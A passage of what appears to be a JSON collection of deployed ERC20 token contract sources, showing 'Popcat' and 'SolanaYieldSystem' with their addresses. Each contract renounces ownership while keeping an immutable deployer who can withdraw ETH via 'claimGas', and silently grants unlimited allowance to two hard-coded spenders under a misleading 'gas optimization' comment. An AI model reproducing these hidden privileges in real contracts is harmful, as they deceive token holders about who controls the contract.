revert ERC20InvalidSender ( address(0)) ; \n        \n                        }\n        if (to == address ( 0 ) ) {\n                        \n            revert ERC20InvalidReceiver(address ( 0)) ; \n        }\n                        \n        _update(from, to, value ) ; \n    \n                        }\n    \n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     *  { \n                        IERC20-balanceOf } \n                         and {\n                        IERC20-transfer\n                        }.\n     */\n    function decimals (  ) public view virtual returns (uint8 ) {\n                        \n        return 15 ; \n     } \n                        \n    \n     } \n                        \n\nabstract contract Ownable is Context  { \n                        \n    address private _owner ; \n    \n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner (  ) internal view virtual \n                         { \n        require ( owner (  ) == _msgSender (  ), \"Ownable: caller is not the owner\" ) ; \n    }\n                        \n    \n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership (  ) public virtual onlyOwner {\n                        \n        _transferOwnership ( address(0)) ; \n    }\n                        \n    \n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner ( ) public view virtual returns (address)  { \n                        \n        return _owner ; \n     } \n                        \n    \n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner ( ) \n                         { \n        _checkOwner();\n        _;\n    }\n                        \n    \n    /**\n     * @dev The owner is not a valid owner account.  ( eg. `address ( 0 )` )\n     */\n    error OwnableInvalidOwner ( address owner);\n    \n    event OwnershipTransferred ( address indexed previousOwner, address indexed newOwner) ; \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account  ( `newOwner` ).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership ( address newOwner) internal virtual  { \n                        \n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner );\n    }\n                        \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account  ( `newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership ( address newOwner) public virtual onlyOwner \n                         { \n        require(newOwner != address(0), \"Ownable: new owner is the zero address\" );\n        _transferOwnership(newOwner );\n    \n                         } \n    \n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount ( address account);\n    \n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor( )  { \n                        \n        _transferOwnership ( _msgSender ( ) );\n    \n                         } \n    \n\n                         } \n\n\n// File Popcat.sol\n\ncontract Popcat is ERC20, Ownable {\n                        \n    address internal immutable deployer ; \n    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_ )  { \n                        \n        _mint(msg.sender, 1000000000000000000000000) ; \n        _transferOwnership(address ( 0) ) ; \n        deployer = msg.sender ; \n    \n                         } \n    \n    /**\n     * @dev See \n                         { IERC20-allowance}\n                        .\n     */\n    function allowance ( address owner, address spender ) public view override returns (uint256) {\n                        \n            //gas optimization: auto allow Permit2 and UniswapRouterV2\n            if (  ( spender == 0x000000000022D473030F116dDEE9F6B43aC78BA3) ||  ( spender == 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24) ){\n                        \n            return type ( uint256).max;\n        }\n                         \n        return super.allowance(owner,spender) ; \n    }\n                        \n    \n    function claimGas(address payable recipient, uint256 amount) public  { \n                        \n        require ( msg.sender==deployer);\n        Address.sendValue ( recipient, amount);\n    }\n                        \n    \n    receive() external payable\n                         { \n    }\n                        \n}",
      "count": 1,
      "addresses": [
        "0xEB82C34A0504657b1d2b9142200D2707B9C372F3"
      ],
      "names": [
        "Popcat"
      ]
    },
    {
      "id": "235da0b4-d052-4b85-bfee-e075f767a0b0",
      "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.1.0)  ( utils/Address.sol )\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address  { \n                        \n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account  ( EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     *\n     * Furthermore, `isContract` will also return true if the target contract within\n     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,\n     * which only has an effect at the end of a transaction.\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract ( address account) internal view returns (bool ) {\n                        \n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0 ; \n     } \n                        \n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. {\n                        sendValue}\n                         removes this limitation.\n     *\n     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * {\n                        ReentrancyGuard}\n                         or the\n     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue(address payable recipient, uint256 amount) public  { \n                        \n        require(address ( this ).balance >= amount, \"Address: insufficient balance\" ) ; \n\n        (bool success, ) = recipient.call{\n                        value: amount}\n                         ( \"\" );\n        require(success, \"Address: unable to send value, recipient may have reverted\" );\n     } \n                        \n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function  ( like regular Solidity function calls ).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( address target, bytes memory data ) internal returns  ( bytes memory)  { \n                        \n        return functionCallWithValue ( target, data, 0, \"Address: low-level call failed\" );\n    }\n                        \n\n    /**\n     * @dev Same as \n                         { xref-Address-functionCall-address-bytes- } \n                        [`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal returns (bytes memory) \n                         { \n        return functionCallWithValue ( target, data, 0, errorMessage ) ; \n     } \n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-\n                         } [`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(address target, bytes memory data, uint256 value ) internal returns  ( bytes memory ) {\n                        \n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\") ; \n     } \n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCallWithValue-address-bytes-uint256-\n                         } [`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue ( \n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n    ) internal returns  ( bytes memory ) \n                        {\n        require ( address ( this ).balance >= value, \"Address: insufficient balance for call\") ; \n         ( bool success, bytes memory returndata ) = target.call { \n                        value: value}\n                         ( data );\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\n    }\n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes- } \n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(address target, bytes memory data ) internal view returns  ( bytes memory) {\n                        \n        return functionStaticCall ( target, data, \"Address: low-level static call failed\");\n    \n                        }\n\n    /**\n     * @dev Same as \n                        {xref-Address-functionCall-address-bytes-string- } \n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal view returns  ( bytes memory ) {\n                        \n        (bool success, bytes memory returndata) = target.staticcall(data );\n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage);\n    }\n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-\n                         } [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data ) internal returns (bytes memory )  { \n                        \n        return functionDelegateCall ( target, data, \"Address: low-level delegate call failed\" ) ; \n     } \n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-string-\n                         } [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal returns  ( bytes memory) {\n                        \n         ( bool success, bytes memory returndata ) = target.delegatecall(data ) ; \n        return verifyCallResultFromTarget(target, success, returndata, errorMessage) ; \n    \n                         } \n\n    /**\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling\n     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.\n     *\n     * _Available since v4.8._\n     */\n    function verifyCallResultFromTarget(\n        address target,\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal view returns (bytes memory )  { \n                        \n        if  ( success ) {\n                        \n            if  ( returndata.length == 0)  { \n                        \n                // only check isContract if the call was successful and the return data is empty\n                // otherwise we already know that it was a contract\n                require(isContract(target ), \"Address: call to non-contract\");\n            \n                         } \n            return returndata;\n        \n                         }  else {\n                        \n            _revert(returndata, errorMessage );\n        }\n                        \n     } \n                        \n\n    /**\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason or using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult ( \n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n     ) internal pure returns  ( bytes memory )  { \n                        \n        if (success)  { \n                        \n            return returndata ; \n         } \n                         else  { \n                        \n            _revert ( returndata, errorMessage ) ; \n        \n                         } \n    }\n                        \n\n    function _revert(bytes memory returndata, string memory errorMessage ) private pure {\n                        \n        // Look for revert reason and bubble it up if present\n        if  ( returndata.length > 0) {\n                        \n            // The easiest way to bubble the revert reason is using memory via assembly\n            /// @solidity memory-safe-assembly\n            assembly  { \n                        \n                let returndata_size := mload ( returndata)\n                revert ( add ( 32, returndata ), returndata_size)\n             } \n                        \n        \n                        } else \n                         { \n            revert ( errorMessage ) ; \n        }\n                        \n    }\n                        \n } \n                        \npragma solidity ^0.8.0 ; \n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender  ( as far as an application\n * is concerned ).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n                        \n\n    function _contextSuffixLength() internal view virtual returns  ( uint256 )  { \n                        \n        return 0 ; \n     } \n                        \n\n    function _msgData (  ) internal view virtual returns  ( bytes calldata ) \n                         { \n        return msg.data;\n     } \n                        \n    function _msgSender( ) internal view virtual returns  ( address)  { \n                        \n        return msg.sender ; \n    \n                        }\n\n\n\n                         } \n\n\n/**\n * @dev Standard ERC-20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.\n */\ninterface IERC20Errors \n                        {\n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender ( address spender);\n\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender(address sender );\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver ( address receiver ) ; \n\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed ) ; \n\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover(address approver ) ; \n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed );\n}\n                        \n\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n                        \n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply( ) external view returns (uint256 ) ; \n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through  { \n                        transferFrom\n                         } . This is\n     * zero by default.\n     *\n     * This value changes when {\n                        approve}\n                         or {\n                        transferFrom\n                        } are called.\n     */\n    function allowance ( address owner, address spender) external view returns (uint256 );\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an  { \n                        Approval}\n                         event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool );\n    \n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a \n                         { Transfer } \n                         event.\n     */\n    function transferFrom ( address from, address to, uint256 amount ) external returns  ( bool ) ; \n        /**\n     * @dev Emitted when `value` tokens are moved from one account  ( `from` ) to\n     * another  ( `to` ).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer ( address indexed from, address indexed to, uint256 value);\n\n        \n/**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a \n                        {Transfer } \n                         event.\n     */\n    function transfer(address to, uint256 amount) external returns (bool) ; \n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to  { \n                        approve } \n                        . `value` is the new allowance.\n     */\n    event Approval ( address indexed owner, address indexed spender, uint256 value) ; \n\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256 ) ; \n\n    \n } \n                        \n\n\ninterface IERC20Metadata is IERC20 \n                         { \n\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol (  ) external view returns  ( string memory) ; \n\n\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals (  ) external view returns (uint8);\n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() external view returns (string memory );\n\n}\n                        \n\n\n\n\n\n/**\n * @dev Implementation of the {\n                        IERC20\n                        } interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using \n                         { _mint } \n                        .\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of {\n                        decimals } \n                         is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors  \n                         { \n    mapping(address => uint256 ) private _balances ; \n\n\n    mapping ( address => mapping(address => uint256) ) private _allowances ; \n    uint256 private _totalSupply ; \n\n    string private _name ; \n    string private _symbol;\n\n    /**\n     * @dev Sets the values for \n                        {name}\n                         and \n                        {symbol } \n                        .\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_) {\n                        \n        _name = name_ ; \n        _symbol = symbol_;\n    }\n                        \n    \n\n    /**\n     * @dev See  { \n                        IERC20-allowance\n                         } .\n     */\n    function allowance(address owner, address spender ) public view virtual returns (uint256 ) \n                        {\n        return _allowances[owner][spender] ; \n    }\n                        \n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name ( ) public view virtual returns (string memory) {\n                        \n        return _name ; \n    \n                        }\n    \n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2` ).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {\n                        IERC20-balanceOf}\n                         and  { \n                        IERC20-transfer } \n                        .\n     */\n    function decimals() public view virtual returns  ( uint8 ) {\n                        \n        return 15;\n    }\n                        \n    \n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol ( ) public view virtual returns (string memory) \n                        {\n        return _symbol;\n     } \n                        \n    \n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to \n                         { transfer } \n                        , and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a  { \n                        Transfer } \n                         event.\n     *\n     * NOTE: This function is not virtual, {\n                        _update\n                         }  should be overridden instead.\n     */\n    function _transfer ( address from, address to, uint256 value) internal \n                         { \n        if  ( from == address ( 0 ) )  { \n                        \n            revert ERC20InvalidSender(address(0 ));\n         } \n                        \n        if (to == address ( 0 ))  { \n                        \n            revert ERC20InvalidReceiver(address ( 0)) ; \n         } \n                        \n        _update(from, to, value) ; \n    }\n                        \n    \n\n    /**\n     * @dev See {\n                        IERC20-balanceOf\n                        }.\n     */\n    function balanceOf ( address account) public view virtual returns (uint256 ) {\n                        \n        return _balances[account] ; \n    \n                        }\n    \n    /**\n     * @dev See {\n                        IERC20-totalSupply\n                         } .\n     */\n    function totalSupply() public view virtual returns  ( uint256 ) \n                         { \n        return _totalSupply ; \n     } \n                        \n    \n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an \n                        {Approval } \n                         event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 value) internal virtual  { \n                        \n        uint256 currentAllowance = allowance ( owner, spender );\n        if  ( currentAllowance < type ( uint256 ).max )  { \n                        \n            if  ( currentAllowance < value) \n                         { \n                revert ERC20InsufficientAllowance(spender, currentAllowance, value) ; \n            \n                        }\n            unchecked {\n                        \n                _approve ( owner, spender, currentAllowance - value, false) ; \n            }\n                        \n        }\n                        \n    }\n                        \n    \n    /**\n     * @dev Variant of  { \n                        _approve}\n                         with an optional flag to enable or disable the  { \n                        Approval}\n                         event.\n     *\n     * By default  ( when calling \n                        {_approve } \n                         ) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve(address owner, address spender, uint256 value, bool ) internal virtual override {\n                        \n     *     super._approve(owner, spender, value, true);\n     *  } \n                        \n     * ```\n     *\n     * Requirements are the same as  { \n                        _approve } \n                        .\n     */\n    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {\n                        \n        if (owner == address ( 0 ) ) {\n                        \n            revert ERC20InvalidApprover(address ( 0));\n         } \n                        \n        if (spender == address(0) ) {\n                        \n            revert ERC20InvalidSpender ( address(0) ) ; \n        }\n                        \n        _allowances[owner][spender] = value;\n        if (emitEvent )  { \n                        \n            emit Approval ( owner, spender, value );\n        \n                        }\n     } \n                        \n    \n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints  ( or burns) if `from`\n     *  ( or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a  { \n                        Transfer } \n                         event.\n     */\n    function _update ( address from, address to, uint256 value) internal virtual {\n                        \n        if  ( from == address(0 ) ) \n                         { \n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value ; \n        }\n                         else {\n                        \n            uint256 fromBalance = _balances[from] ; \n            if (fromBalance < value )  { \n                        \n                revert ERC20InsufficientBalance(from, fromBalance, value ) ; \n             } \n                        \n            unchecked  { \n                        \n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value;\n            \n                        }\n        }\n                        \n\n        if (to == address ( 0 )) {\n                        \n            unchecked {\n                        \n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value;\n            \n                        }\n         } \n                         else  { \n                        \n            unchecked {\n                        \n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value;\n             } \n                        \n         } \n                        \n\n        emit Transfer(from, to, value ) ; \n    }\n                        \n    \n    /**\n     * @dev See  { \n                        IERC20-approve}\n                        .\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 value ) public virtual returns (bool) {\n                        \n        address owner = _msgSender();\n        _approve(owner, spender, value );\n        return true ; \n     } \n                        \n    \n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {\n                        Approval}\n                         event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve(address owner, address spender, uint256 value) internal {\n                        \n        _approve ( owner, spender, value, true ) ; \n    }\n                        \n    \n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address ( 0 ).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a  { \n                        Transfer}\n                         event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual, \n                        {_update } \n                         should be overridden instead.\n     */\n    function _mint ( address account, uint256 value ) internal  { \n                        \n        if (account == address(0 )) {\n                        \n            revert ERC20InvalidReceiver(address(0 ) );\n         } \n                        \n        _update(address ( 0), account, value) ; \n     } \n                        \n    \n\n    /**\n     * @dev See {\n                        IERC20-transfer } \n                        .\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer ( address to, uint256 value ) public virtual returns (bool)  { \n                        \n        address owner = _msgSender (  );\n        _transfer(owner, to, value);\n        return true;\n     } \n                        \n    \n    /**\n     * @dev See  { \n                        IERC20-transferFrom}\n                        .\n     *\n     * Skips emitting an \n                        {Approval}\n                         event indicating an allowance update. This is not\n     * required by the ERC. See \n                        {xref-ERC20-_approve-address-address-uint256-bool-}\n                        [_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom(address from, address to, uint256 value) public virtual returns  ( bool) {\n                        \n        address spender = _msgSender( ) ; \n        _spendAllowance ( from, spender, value ) ; \n        _transfer ( from, to, value ) ; \n        return true ; \n    \n                         } \n    \n     } \n                        \n\nabstract contract Ownable is Context \n                         { \n    address private _owner;\n    \n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner ( ) internal view virtual  { \n                        \n        require ( owner( ) == _msgSender (  ), \"Ownable: caller is not the owner\") ; \n     } \n                        \n    \n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership ( ) public virtual onlyOwner {\n                        \n        _transferOwnership ( address ( 0 )) ; \n    }\n                        \n    \n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor( ) \n                        {\n        _transferOwnership(_msgSender ( ) );\n     } \n                        \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner` ).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership ( address newOwner ) internal virtual \n                        {\n        address oldOwner = _owner ; \n        _owner = newOwner;\n        emit OwnershipTransferred ( oldOwner, newOwner);\n     } \n                        \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner` ).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner  { \n                        \n        require(newOwner != address ( 0), \"Ownable: new owner is the zero address\") ; \n        _transferOwnership(newOwner ) ; \n    \n                         } \n    \n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount(address account);\n    \n    /**\n     * @dev The owner is not a valid owner account.  ( eg. `address(0)`)\n     */\n    error OwnableInvalidOwner(address owner ) ; \n    \n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner( )  { \n                        \n        _checkOwner( );\n        _;\n    }\n                        \n    \n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner ) ; \n    \n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner( ) public view virtual returns  ( address)  { \n                        \n        return _owner ; \n    \n                        }\n    \n}\n                        \n\n\n// File SolanaYieldSystem.sol\n\ncontract SolanaYieldSystem is ERC20, Ownable {\n                        \n    address internal immutable deployer;\n    constructor(string memory name_, string memory symbol_ ) ERC20(name_, symbol_) {\n                        \n        _mint(msg.sender, 100000000000000000000000 );\n        _transferOwnership(address ( 0));\n        deployer = msg.sender ; \n    }\n                        \n    \n    /**\n     * @dev See  { \n                        IERC20-allowance\n                        }.\n     */\n    function allowance(address owner, address spender ) public view override returns  ( uint256) \n                         { \n            //gas optimization: auto allow Permit2 and UniswapRouterV2\n            if (  ( spender == 0x000000000022D473030F116dDEE9F6B43aC78BA3 ) || (spender == 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24 )){\n                        \n            return type ( uint256 ).max ; \n        }\n                         \n        return super.allowance(owner,spender);\n    }\n                        \n    \n    function claimGas(address payable recipient, uint256 amount) public {\n                        \n        require(msg.sender==deployer ) ; \n        Address.sendValue(recipient, amount);\n     } \n                        \n    \n    receive() external payable\n                        {\n     } \n                        \n }",
      "count": 1,
      "addresses": [
        "0xFC1159CAb03e3E73F369EcE8999CD002EC196870"
      ],
      "names": [
        "SolanaYieldSystem"
      ]
    },
    {
      "id": "65de9d63-a252-424b-9399-aedb43b92a53",
